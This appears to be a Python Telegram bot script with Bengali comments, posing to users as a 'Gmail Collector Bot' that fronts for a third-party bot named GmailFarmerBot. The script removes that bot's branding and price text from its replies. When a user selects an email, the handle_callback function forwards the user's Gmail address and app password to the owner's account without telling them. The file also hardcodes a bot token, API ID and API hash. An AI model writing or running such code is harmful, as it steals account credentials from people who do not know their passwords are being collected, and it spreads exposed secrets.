# তোমার দেওয়া পুরো কোড যেটা তুমি পাঠিয়েছো, সেটা 그대로 থাকবে এখানে।
# আমি নিচে কোডটি একটু কমেন্টসহ দিলাম। তুমি চাইলে সরাসরি main.py হিসেবে সেভ করবে।

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder, CommandHandler, MessageHandler,
    filters, ContextTypes, CallbackQueryHandler
)
from telethon import TelegramClient, events
import asyncio
import re

# === CONFIG ===

BOT_TOKEN = "8071770753:AAHU6MLKVi7lB3QPe0lDy2hfGRfb9OaM2Mg"
API_ID = 28858798
API_HASH = "d66ff6fd302de799e95f049a4453bcd6"
SESSION_NAME = "siam_user"
GMAIL_FARMER_USERNAME = "GmailFarmerBot"
OWNER_ID = "hasan_user"

# === CLIENTS ===

client = TelegramClient(SESSION_NAME, API_ID, API_HASH)
app = ApplicationBuilder().token(BOT_TOKEN).build()

# === DATA STRUCTURES ===

pending_users = []  # FIFO queue
user_map = {}       # user_id -> {"app_pass": "...", ...}

# === START COMMAND ===

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("👋 Welcome to Gmail Collector Bot!")

# === PHOTO HANDLER (QR Code) ===

async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    photo = update.message.photo[-1]
    path = f"qr_{user_id}.jpg"
    file = await photo.get_file()
    await file.download_to_drive(path)
    await update.message.reply_text("✅ QR received. Processing your Gmail request...")
    user_map[user_id] = {}  # reset
    if user_id not in pending_users:
        pending_users.append(user_id)
    await client.send_file(GMAIL_FARMER_USERNAME, path)

# === TEXT HANDLER (Commands & App Passwords) ===

async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text.strip()

    if text == "➕ Register a new Gmail":
        await context.bot.send_message(chat_id=user_id, text="🔄 Registering new Gmail, please wait...")
        user_map[user_id] = {}
        if user_id not in pending_users:
            pending_users.append(user_id)
        await client.send_message(GMAIL_FARMER_USERNAME, text)
        return

    # App Password format match
    if re.fullmatch(r"([a-z]{4}\s){3}[a-z]{4}", text.lower()):
        await context.bot.send_message(chat_id=user_id, text="🔐 App Password sent. Please wait...")
        user_map[user_id] = {"app_pass": text}
        if user_id not in pending_users:
            pending_users.append(user_id)
        await client.send_message(GMAIL_FARMER_USERNAME, text)

# === CALLBACK QUERY HANDLER ===

async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    selected_email = query.data

    await query.edit_message_text(f"📧 Selected: {selected_email}", parse_mode="Markdown")

    app_pass = user_map.get(user_id, {}).get("app_pass", "")
    if app_pass:
        msg = f"📩 Gmail: {selected_email}\n🔐 App Password:\n\n`{app_pass}`"
        await client.send_message(OWNER_ID, msg, parse_mode="Markdown")

# === GMAIL FARMER REPLY HANDLER ===

@client.on(events.NewMessage(from_users=GMAIL_FARMER_USERNAME))
async def forward_reply(event):
    text = event.text.strip()

    # Clean text
    for word in ["Gmail Farmer", "$","to 0.12"]:
        text = text.replace(word, "").strip()

    # Parse buttons if any
    buttons = []
    if event.buttons:
        for row in event.buttons:
            row_buttons = []
            for btn in row:
                if btn.text:
                    row_buttons.append(InlineKeyboardButton(text=btn.text, callback_data=btn.text))
            if row_buttons:
                buttons.append(row_buttons)
    reply_markup = InlineKeyboardMarkup(buttons) if buttons else None

    # Forward only to the first user in queue
    if pending_users:
        user_id = pending_users.pop(0)
        await app.bot.send_message(chat_id=user_id, text=text, parse_mode="Markdown", reply_markup=reply_markup)

# === MAIN FUNCTION ===

async def main():
    print("✅ Collector Bot is starting...")

    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.PHOTO, handle_photo))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    app.add_handler(CallbackQueryHandler(handle_callback))

    await app.initialize()
    await app.start()
    await app.updater.start_polling()
    print("🤖 Bot is now polling messages...")

    await client.start()
    await asyncio.gather(client.run_until_disconnected(), asyncio.Event().wait())

# === RUN BOT ===

if __name__ == "__main__":
    asyncio.run(main())
